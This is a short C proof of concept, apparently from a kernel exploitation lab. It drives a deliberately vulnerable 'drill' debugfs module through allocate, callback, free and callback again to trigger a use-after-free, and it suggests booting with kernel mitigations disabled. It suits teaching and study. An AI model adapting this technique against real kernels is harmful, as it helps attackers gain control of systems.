/*
 * Funny experiments with Linux kernel exploitation of use-after-free.
 * Run the kernel with "pti=off oops=panic ftrace_dump_on_oops nokaslr"
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

int act(int fd, char code)
{
	ssize_t bytes = 0;

	bytes = write(fd, &code, 1);
	if (bytes <= 0) {
		perror("[-] write");
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}

int main(void)
{
	unsigned char *spray_data = NULL;
	int ret = EXIT_FAILURE;
	int fd = -1;

	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());

	/*
	 * Prepare
	 */

	fd = open("/sys/kernel/debug/drill/drill_act", O_WRONLY);
	if (fd < 0) {
		perror("[-] open drill_act");
		goto end;
	}

	printf("[+] drill_act is opened\n");

	if (act(fd, '1') == EXIT_FAILURE)
		goto end;
	else
		printf("[+] DRILL_ACT_ALLOC\n");

	if (act(fd, '2') == EXIT_FAILURE)
		goto end;
	else
		printf("[+] DRILL_ACT_CALLBACK\n");

	if (act(fd, '4') == EXIT_FAILURE)
		goto end;
	else
		printf("[+] DRILL_ACT_RESET\n");

	if (act(fd, '2') == EXIT_FAILURE)
		goto end;
	else
		printf("[+] DRILL_ACT_CALLBACK\n");


	printf("[+] The End\n");

end:
	if (fd >= 0) {
		ret = close(fd);
		if (ret != 0)
			perror("[-] close fd");
	}

	return ret;
}
